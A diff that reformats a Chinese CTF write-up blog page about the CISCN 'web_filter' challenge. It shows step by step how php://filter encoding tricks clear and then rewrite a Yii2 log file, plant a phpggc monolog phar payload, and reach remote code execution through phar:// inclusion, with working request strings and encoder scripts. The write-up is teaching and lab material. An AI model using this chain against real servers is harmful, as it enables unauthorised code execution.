@@ -1,8 +1,223 @@
-<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#08F}</style><title>CISCN_web_filter</title><meta name=description content="web security | code review"><meta name=keywords content="blog,gokarna,hugo,yii2,RCE"><meta property="og:url" content="http://nullarray.top/posts/ciscn-web-filter/"><meta property="og:type" content="website"><meta property="og:title" content="CISCN_web_filter"><meta property="og:description" content="web security | code review"><meta property="og:image" content="https://i.loli.net/2021/05/27/lVHJnBUsLogA5PN.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="CISCN_web_filter"><meta name=twitter:description content="web security | code review"><meta property="twitter:domain" content="http://nullarray.top/posts/ciscn-web-filter/"><meta property="twitter:url" content="http://nullarray.top/posts/ciscn-web-filter/"><meta name=twitter:image content="https://i.loli.net/2021/05/27/lVHJnBUsLogA5PN.png"><link rel=canonical href=http://nullarray.top/posts/ciscn-web-filter/><link rel=stylesheet type=text/css href=http://nullarray.top/css/normalize.min.css media=print onload="this.media='all'"><link rel=stylesheet type=text/css href=http://nullarray.top/css/main.css><link disabled id=dark-theme rel=stylesheet href=http://nullarray.top/css/dark.css><script src=http://nullarray.top/js/svg-injector.min.js></script><script src=http://nullarray.top/js/feather-icons.min.js></script><script src=http://nullarray.top/js/main.js></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.13.16/dist/katex.min.css integrity=sha384-6LkG2wmY8FK9E0vU9OOr8UvLwsaqUg9SETfpq4uTCN1agNe8HRdE9ABlk+fVx6gZ crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.13.16/dist/katex.min.js integrity=sha384-31El76TwmbHj4rF9DyLsygbq6xoIobG0W+jqXim+a3dU9W53tdH3A/ngRPxOzzaB crossorigin=anonymous></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.13.16/dist/contrib/auto-render.min.js integrity=sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl crossorigin=anonymous onload=renderMathInElement(document.body)></script></head><body><script type=text/javascript>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=http://nullarray.top><img src=https://i.loli.net/2021/05/27/iSZvInqMko5AT7C.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=http://nullarray.top>le3teq's Blog</a></div><div class=nav-links><div class=nav-link><a href=http://nullarray.top/>Home</a></div><div class=nav-link><a href=http://nullarray.top/posts/>Posts</a></div><div class=nav-link><a href=http://nullarray.top/projects/>Projects</a></div><div class=nav-link><a href=http://nullarray.top/tags/>Tags</a></div><div class=nav-link><a href=http://nullarray.top/lives/>Lives</a></div><div class=nav-link><a href=https://github.com/526avijitgupta/gokarna><span data-feather=github></span></a></div><div class=nav-link><a href=http://nullarray.top><span data-feather=coffee></span></a></div><div class=nav-link><a href=http://nullarray.top/index.xml><span data-feather=rss></span></a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><a><span id=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><a><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=http://nullarray.top/>Home</a></li><li class=nav-item><a href=http://nullarray.top/posts/>Posts</a></li><li class=nav-item><a href=http://nullarray.top/projects/>Projects</a></li><li class=nav-item><a href=http://nullarray.top/tags/>Tags</a></li><li class=nav-item><a href=http://nullarray.top/lives/>Lives</a></li><li class=nav-item><a href=https://github.com/526avijitgupta/gokarna><span data-feather=github></span></a></li><li class=nav-item><a href=http://nullarray.top><span data-feather=coffee></span></a></li><li class=nav-item><a href=http://nullarray.top/index.xml><span data-feather=rss></span></a></li><li class="nav-item dark-theme-toggle"><a><span id=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>CISCN_web_filter</h1><small role=doc-subtitle></small><p class=post-date>May 25, 2021</p><ul class=post-tags><li class=post-tag><a href=http://nullarray.top/tags/yii2>yii2</a></li><li class=post-tag><a href=http://nullarray.top/tags/rce>RCE</a></li></ul></div><div class=post-content><p><p>国赛的一道php://filter的过滤器利用，顺便学习一下laravel8的debug RCE</p><h3 id=本地环境搭建>本地环境搭建</h3><p>mac下composer直接安装yii2</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>composer create-project --prefer-dist yiisoft/yii2-app-basic basic
-</code></pre></div><p>题目给了<code>composer.json</code>和site控制器内容（应该，比较一下生成的yii2的<code>composer.json</code>文件，发现缺少monolog模块</p><p><img src=https://i.loli.net/2021/05/28/9XdjVUPaI1yTAzJ.png alt></p><p>添加进项目中的<code>composer.json</code>，执行<code>composer update</code>即可安装缺少的日志模块。接着在config目录的<code>web.php</code>文件中设置日志级别（只需要error级别即可，方便后续利用</p><p><img src=https://i.loli.net/2021/05/28/pvkKnBEg3Q2rITs.png alt></p><p>最后把题目给的<code>SiteController.php</code>文件中的漏洞代码添加上去</p><p><img src=imgs/duqoSB7DG1CiUwz.png alt></p><h3 id=利用>利用</h3><p>根据添加的代码我们能发现这就是<code>laravel8</code>的RCE的简化版，没有了代码审计流程，直接给了漏洞点。根据漏洞利用过程，简化为四步。</p><ol><li><strong>清空日志</strong></li><li><strong>写入需要恶意payload到日志</strong></li><li><strong>利用php://filter清除多余内容，转化为phar纯净文件</strong></li><li><strong>利用phar协议getshell</strong></li></ol><p>先进行日志清除，对于yii2的日志跟进前面的日志文件方法</p><p><img src=https://i.loli.net/2021/05/28/JT8wGgB4fnUdSCp.png alt></p><p>找到日志位置 <code>/runtime/logs/app.log</code></p><p>先进行日志清除，这里使用consumed过滤器，用来清除文件内容，具体作用官方并未公开细节。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>php://filter/read<span style=color:#ff79c6>=</span>consumed/resource<span style=color:#ff79c6>=</span>../runtime/logs/app.log
-</code></pre></div><p>根据<code>Laravel8</code>的RCE还可以用</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>php://filter/write<span style=color:#ff79c6>=</span>convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource<span style=color:#ff79c6>=</span>../runtime/logs/app.log
-</code></pre></div><p>来清除日志，主要利用思路是将文件内容变为非base64字符，然后使用<code>convert.base64-decode</code>过滤器来进行解密，这样就会达到清空目的，具体细节参考</p><p><a href=https://xz.aliyun.com/t/9030#toc-4>Laravel Debug mode RCE（CVE-2021-3129）分析复现</a></p><p>接着是写入恶意<strong>payload</strong>，通过前面文章的分析复现我们可以知道，写入payload后日志格式为</p><pre><code>[x]payload [x]payload [x]部分payload
-</code></pre><p>也就是两部分完整payload和一部分残缺的payload，这里看看我们<strong>yii2</strong>下面的日志格式。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml>2021-05-28 01:51:07 [::1][-][qevmoqnh9m29scm5b1c06l0jh5][error][yii\base\ErrorException:2] yii\base\ErrorException: file_get_contents(hshui): Failed to open stream: No such file or directory in /Users/sw0r3d/works/test/yii_test/basic/controllers/SiteController.php:65
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #08F;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>CISCN_web_filter</title>
+    <meta name="description" content="web security | code review">
+    <meta name="keywords" content='blog, gokarna, hugo, yii2, RCE'>
+
+    <meta property="og:url" content="http://nullarray.top/posts/ciscn-web-filter/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="CISCN_web_filter">
+    <meta property="og:description" content="web security | code review">
+    <meta property="og:image" content="https://i.loli.net/2021/05/27/lVHJnBUsLogA5PN.png">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="CISCN_web_filter">
+    <meta name="twitter:description" content="web security | code review">
+    <meta property="twitter:domain" content="http://nullarray.top/posts/ciscn-web-filter/">
+    <meta property="twitter:url" content="http://nullarray.top/posts/ciscn-web-filter/">
+    <meta name="twitter:image" content="https://i.loli.net/2021/05/27/lVHJnBUsLogA5PN.png">
+
+    
+    <link rel="canonical" href="http://nullarray.top/posts/ciscn-web-filter/" />
+
+    <link rel="stylesheet" type="text/css" href="http://nullarray.top/css/normalize.min.css" media="print" onload="this.media='all'">
+    <link rel="stylesheet" type="text/css" href="http://nullarray.top/css/main.css">
+    <link disabled id="dark-theme" rel="stylesheet" href="http://nullarray.top/css/dark.css">
+
+    <script src="http://nullarray.top/js/svg-injector.min.js"></script>
+    <script src="http://nullarray.top/js/feather-icons.min.js"></script>
+    <script src="http://nullarray.top/js/main.js"></script>
+
+    
+    
+        <!-- KaTeX -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.16/dist/katex.min.css" integrity="sha384-6LkG2wmY8FK9E0vU9OOr8UvLwsaqUg9SETfpq4uTCN1agNe8HRdE9ABlk+fVx6gZ" crossorigin="anonymous">
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.16/dist/katex.min.js" integrity="sha384-31El76TwmbHj4rF9DyLsygbq6xoIobG0W+jqXim+a3dU9W53tdH3A/ngRPxOzzaB" crossorigin="anonymous"></script>
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.16/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"
+        onload="renderMathInElement(document.body);"></script>
+  
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="http://nullarray.top">
+                <img src="https://i.loli.net/2021/05/27/iSZvInqMko5AT7C.jpg" alt="avatar" />
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="http://nullarray.top">le3teq&#39;s Blog</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="http://nullarray.top/"> Home </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="http://nullarray.top/posts/"> Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="http://nullarray.top/projects/"> Projects </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="http://nullarray.top/tags/"> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="http://nullarray.top/lives/"> Lives </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/526avijitgupta/gokarna"><span data-feather='github'></span>  </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="http://nullarray.top"><span data-feather='coffee'></span>  </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="http://nullarray.top/index.xml"><span data-feather='rss'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <a>
+                    <span id="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="http://nullarray.top/"> Home </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="http://nullarray.top/posts/"> Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="http://nullarray.top/projects/"> Projects </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="http://nullarray.top/tags/"> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="http://nullarray.top/lives/"> Lives </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/526avijitgupta/gokarna"><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="http://nullarray.top"><span data-feather='coffee'></span>  </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="http://nullarray.top/index.xml"><span data-feather='rss'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <a>
+                        <span id="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>CISCN_web_filter</h1>
+        <small role="doc-subtitle"></small>
+        <p class="post-date">
+            May 25, 2021
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="http://nullarray.top/tags/yii2">yii2</a></li>
+        
+            <li class="post-tag"><a href="http://nullarray.top/tags/rce">RCE</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <p>国赛的一道php://filter的过滤器利用，顺便学习一下laravel8的debug RCE</p>
+<h3 id="本地环境搭建">本地环境搭建</h3>
+<p>mac下composer直接安装yii2</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">composer create-project --prefer-dist yiisoft/yii2-app-basic basic
+</code></pre></div><p>题目给了<code>composer.json</code>和site控制器内容（应该，比较一下生成的yii2的<code>composer.json</code>文件，发现缺少monolog模块</p>
+<p><img src="https://i.loli.net/2021/05/28/9XdjVUPaI1yTAzJ.png" alt=""></p>
+<p>添加进项目中的<code>composer.json</code>，执行<code>composer update</code>即可安装缺少的日志模块。接着在config目录的<code>web.php</code>文件中设置日志级别（只需要error级别即可，方便后续利用</p>
+<p><img src="https://i.loli.net/2021/05/28/pvkKnBEg3Q2rITs.png" alt=""></p>
+<p>最后把题目给的<code>SiteController.php</code>文件中的漏洞代码添加上去</p>
+<p><img src="imgs/duqoSB7DG1CiUwz.png" alt=""></p>
+<h3 id="利用">利用</h3>
+<p>根据添加的代码我们能发现这就是<code>laravel8</code>的RCE的简化版，没有了代码审计流程，直接给了漏洞点。根据漏洞利用过程，简化为四步。</p>
+<ol>
+<li><strong>清空日志</strong></li>
+<li><strong>写入需要恶意payload到日志</strong></li>
+<li><strong>利用php://filter清除多余内容，转化为phar纯净文件</strong></li>
+<li><strong>利用phar协议getshell</strong></li>
+</ol>
+<p>先进行日志清除，对于yii2的日志跟进前面的日志文件方法</p>
+<p><img src="https://i.loli.net/2021/05/28/JT8wGgB4fnUdSCp.png" alt=""></p>
+<p>找到日志位置 <code>/runtime/logs/app.log</code></p>
+<p>先进行日志清除，这里使用consumed过滤器，用来清除文件内容，具体作用官方并未公开细节。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">php://filter/read<span style="color:#ff79c6">=</span>consumed/resource<span style="color:#ff79c6">=</span>../runtime/logs/app.log
+</code></pre></div><p>根据<code>Laravel8</code>的RCE还可以用</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">php://filter/write<span style="color:#ff79c6">=</span>convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource<span style="color:#ff79c6">=</span>../runtime/logs/app.log
+</code></pre></div><p>来清除日志，主要利用思路是将文件内容变为非base64字符，然后使用<code>convert.base64-decode</code>过滤器来进行解密，这样就会达到清空目的，具体细节参考</p>
+<p><a href="https://xz.aliyun.com/t/9030#toc-4">Laravel Debug mode RCE（CVE-2021-3129）分析复现</a></p>
+<p>接着是写入恶意<strong>payload</strong>，通过前面文章的分析复现我们可以知道，写入payload后日志格式为</p>
+<pre><code>[x]payload [x]payload [x]部分payload
+</code></pre><p>也就是两部分完整payload和一部分残缺的payload，这里看看我们<strong>yii2</strong>下面的日志格式。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">2021-05-28 01:51:07 [::1][-][qevmoqnh9m29scm5b1c06l0jh5][error][yii\base\ErrorException:2] yii\base\ErrorException: file_get_contents(hshui): Failed to open stream: No such file or directory in /Users/sw0r3d/works/test/yii_test/basic/controllers/SiteController.php:65
 Stack trace:
 #0 [internal function]: yii\base\ErrorHandler-&gt;handleError(2, &#39;file_get_conten...&#39;, &#39;/Users/sw0r3d/w...&#39;, 65)
 #1 /Users/sw0r3d/works/test/yii_test/basic/controllers/SiteController.php(65): file_get_contents(&#39;hshui&#39;)
@@ -14,17 +229,82 @@ Stack trace:
 #7 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/base/Application.php(392): yii\web\Application-&gt;handleRequest(Object(yii\web\Request))
 #8 /Users/sw0r3d/works/test/yii_test/basic/web/index.php(12): yii\base\Application-&gt;run()
 #9 {main}
-</code></pre></div><p>可以看到其实只有两部分payload，也就是</p><pre><code>[x]payload [x]部分payload
-</code></pre><p>格式会影响我们写入payload，我们先尝试写普通字符，通过原作者提出的<code>convert.iconv.utf-16le.utf-8</code>方法，以及前面清空日志的过程，我们可以将写入payload中使用过滤器的顺序表示为</p><p><strong>convert.quoted-printable-decode</strong> - > <strong>convert.iconv.utf-16le.utf-8</strong> -> <strong>convert.base64-decode</strong></p><p>这其实就是一个日志清除的简化版，不过在<strong>utf-16le.utf-8</strong>过滤器使用的时候是每次对两个字符进行识别，所以在两部分完整payload的时候会清除失败，对于部分payload的情况有50%机率成功。</p><p>通过上面这个链，我们需要构造反向链即可写入任意字符，也就是base64加密后符合<code>utf-16le.utf-8</code>以及<code>quoted-printable-decode</code>解密，base64我们能实现，<code>utf-16le.utf-8</code>参考官方文档</p><p><img src=https://i.loli.net/2021/05/28/MTEiLgymUt3zGpY.png alt=image-20210528111652761></p><p>也就是在字符和字符之间添加了<code>\0</code>，而<code>quote-printable</code>则是转成<code>=</code> + ASCII码</p><p><img src=https://i.loli.net/2021/05/28/5lEK7VuyZRdxbjO.png alt=image-20210528112030143></p><p>参考上面文章的生成符合链字符的脚本</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#ff79c6>import</span> base64
+</code></pre></div><p>可以看到其实只有两部分payload，也就是</p>
+<pre><code>[x]payload [x]部分payload
+</code></pre><p>格式会影响我们写入payload，我们先尝试写普通字符，通过原作者提出的<code>convert.iconv.utf-16le.utf-8</code>方法，以及前面清空日志的过程，我们可以将写入payload中使用过滤器的顺序表示为</p>
+<p><strong>convert.quoted-printable-decode</strong> - &gt; <strong>convert.iconv.utf-16le.utf-8</strong> -&gt; <strong>convert.base64-decode</strong></p>
+<p>这其实就是一个日志清除的简化版，不过在<strong>utf-16le.utf-8</strong>过滤器使用的时候是每次对两个字符进行识别，所以在两部分完整payload的时候会清除失败，对于部分payload的情况有50%机率成功。</p>
+<p>通过上面这个链，我们需要构造反向链即可写入任意字符，也就是base64加密后符合<code>utf-16le.utf-8</code>以及<code>quoted-printable-decode</code>解密，base64我们能实现，<code>utf-16le.utf-8</code>参考官方文档</p>
+<p><img src="https://i.loli.net/2021/05/28/MTEiLgymUt3zGpY.png" alt="image-20210528111652761"></p>
+<p>也就是在字符和字符之间添加了<code>\0</code>，而<code>quote-printable</code>则是转成<code>=</code> +  ASCII码</p>
+<p><img src="https://i.loli.net/2021/05/28/5lEK7VuyZRdxbjO.png" alt="image-20210528112030143"></p>
+<p>参考上面文章的生成符合链字符的脚本</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> base64
 
-res <span style=color:#ff79c6>=</span> base64<span style=color:#ff79c6>.</span>b64encode(<span style=color:#f1fa8c>&#39;xxxxx&#39;</span>)
-<span style=color:#ff79c6>print</span>(<span style=color:#f1fa8c>&#39;&#39;</span><span style=color:#ff79c6>.</span>join([<span style=color:#f1fa8c>&#34;=&#34;</span> <span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>hex</span>(<span style=color:#8be9fd;font-style:italic>ord</span>(i))[<span style=color:#bd93f9>2</span>:] <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;=00&#34;</span> <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> res])<span style=color:#ff79c6>.</span>upper())
-<span style=color:#6272a4>#=65=00=48=00=68=00=34=00=65=00=48=00=67=00=3D=00</span>
-</code></pre></div><h4 id=tips>tips</h4><p>下面关于写入payload的两个问题，如果我们直接写入生成的字符</p><p><img src=https://i.loli.net/2021/05/28/iaKdl5eBM8n93p6.png alt=image-20210528113356324></p><p><img src=https://i.loli.net/2021/05/28/65iQzAqNUOZc3HK.png alt=image-20210528114302006></p><p><code>utf-16le.utf-8</code>报错了，前面说过这个过滤器对于字符转换是两个字符进行识别，所以我们需要在写入payload的后面加上一个任意字符，让payload结果为双数。</p><p>写入<code>payload</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http>?file==65=00=48=00=68=00=34=00=65=00=48=00=67=00=3D=00x
-</code></pre></div><p>清除其他字符</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http>?file=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/logs/app.log
-</code></pre></div><p>成功写入</p><p><img src=https://i.loli.net/2021/05/28/jWtiyCBgD5vrTN3.png alt></p><p>下面就是写入任意<code>payload</code>，用<code>phpggc</code>找一个符合<code>monolog</code>版本的RCE链，生成</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>php -d<span style=color:#f1fa8c>&#39;phar.readonly=0&#39;</span> ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0|python -c <span style=color:#f1fa8c>&#34;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in sys.stdin.read()]).upper())&#34;</span>
-<span style=color:#6272a4>#如果要执行带有空格的命令，需要用引号包含一下，类似system &#39;ls /&#39;</span>
-</code></pre></div><p>用上面脚本生成一下然后写入，本地写入payload后进行干扰字符清除的时候，因为长度问题可能会导致转换出错，转化错误就添加一个字符保证为双数即可。</p><p>重复上面写入任意字符操作，最后用phar进行文件包含</p><pre><code class=language-url data-lang=url>?file=phar://../runtime/logs/app.log/test.txt
-</code></pre><p><img src=https://i.loli.net/2021/05/28/Unckv29FwsQ3YCB.png alt=image-20210528135430505></p><h3 id=后续-5-28>后续 5-28</h3><p>由于前面有提到 <code>convert.iconv.utf-16le.utf-8</code> 过滤器是通过每两个字符进行转换，🤔了一下，如果把日志内容经过base64加密一次转成双数的字符，然后再用 <code>utf-16le</code> 来转换成非base64字符，最后再base64解密一次，应该也可以达到清除日志的目的。</p><pre><code class=language-url data-lang=url>?file=php://filter/write=convert.base64-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log
-</code></pre><p>结合之前的方式就有三种清除日志的方法，对于写日志<code>strips.tags</code>应该也可以进行利用( Dog3的师傅告诉我的。</p><p>最后是对于命令执行，由于触发函数是<code>call_user_func</code>，在php7版本后，<code>assert</code>不能用来进行代码执行了，导致写shell的想法落空，最后也没成功。</p></p></div></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><ul><li><a href=#本地环境搭建>本地环境搭建</a></li><li><a href=#利用>利用</a><ul><li><a href=#tips>tips</a></li></ul></li><li><a href=#后续-5-28>后续 5-28</a></li></ul></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2022 le3's blog</span>
-<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/526avijitgupta/gokarna>Gokarna</a></span></footer></body></html>
+res <span style="color:#ff79c6">=</span> base64<span style="color:#ff79c6">.</span>b64encode(<span style="color:#f1fa8c">&#39;xxxxx&#39;</span>)
+<span style="color:#ff79c6">print</span>(<span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join([<span style="color:#f1fa8c">&#34;=&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">hex</span>(<span style="color:#8be9fd;font-style:italic">ord</span>(i))[<span style="color:#bd93f9">2</span>:] <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;=00&#34;</span> <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> res])<span style="color:#ff79c6">.</span>upper())
+<span style="color:#6272a4">#=65=00=48=00=68=00=34=00=65=00=48=00=67=00=3D=00</span>
+</code></pre></div><h4 id="tips">tips</h4>
+<p>下面关于写入payload的两个问题，如果我们直接写入生成的字符</p>
+<p><img src="https://i.loli.net/2021/05/28/iaKdl5eBM8n93p6.png" alt="image-20210528113356324"></p>
+<p><img src="https://i.loli.net/2021/05/28/65iQzAqNUOZc3HK.png" alt="image-20210528114302006"></p>
+<p><code>utf-16le.utf-8</code>报错了，前面说过这个过滤器对于字符转换是两个字符进行识别，所以我们需要在写入payload的后面加上一个任意字符，让payload结果为双数。</p>
+<p>写入<code>payload</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http">?file==65=00=48=00=68=00=34=00=65=00=48=00=67=00=3D=00x
+</code></pre></div><p>清除其他字符</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http">?file=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/logs/app.log
+</code></pre></div><p>成功写入</p>
+<p><img src="https://i.loli.net/2021/05/28/jWtiyCBgD5vrTN3.png" alt=""></p>
+<p>下面就是写入任意<code>payload</code>，用<code>phpggc</code>找一个符合<code>monolog</code>版本的RCE链，生成</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">php -d<span style="color:#f1fa8c">&#39;phar.readonly=0&#39;</span> ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0|python -c <span style="color:#f1fa8c">&#34;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in sys.stdin.read()]).upper())&#34;</span>
+<span style="color:#6272a4">#如果要执行带有空格的命令，需要用引号包含一下，类似system &#39;ls /&#39;</span>
+</code></pre></div><p>用上面脚本生成一下然后写入，本地写入payload后进行干扰字符清除的时候，因为长度问题可能会导致转换出错，转化错误就添加一个字符保证为双数即可。</p>
+<p>重复上面写入任意字符操作，最后用phar进行文件包含</p>
+<pre><code class="language-url" data-lang="url">?file=phar://../runtime/logs/app.log/test.txt
+</code></pre><p><img src="https://i.loli.net/2021/05/28/Unckv29FwsQ3YCB.png" alt="image-20210528135430505"></p>
+<h3 id="后续-5-28">后续 5-28</h3>
+<p>由于前面有提到 <code>convert.iconv.utf-16le.utf-8</code> 过滤器是通过每两个字符进行转换，🤔了一下，如果把日志内容经过base64加密一次转成双数的字符，然后再用 <code>utf-16le</code> 来转换成非base64字符，最后再base64解密一次，应该也可以达到清除日志的目的。</p>
+<pre><code class="language-url" data-lang="url">?file=php://filter/write=convert.base64-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log
+</code></pre><p>结合之前的方式就有三种清除日志的方法，对于写日志<code>strips.tags</code>应该也可以进行利用( Dog3的师傅告诉我的。</p>
+<p>最后是对于命令执行，由于触发函数是<code>call_user_func</code>，在php7版本后，<code>assert</code>不能用来进行代码执行了，导致写shell的想法落空，最后也没成功。</p>
+
+        </p>
+    </div>
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#本地环境搭建">本地环境搭建</a></li>
+            <li><a href="#利用">利用</a>
+              <ul>
+                <li><a href="#tips">tips</a></li>
+              </ul>
+            </li>
+            <li><a href="#后续-5-28">后续 5-28</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    <span>&copy; 2022 le3&#39;s blog</span>
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
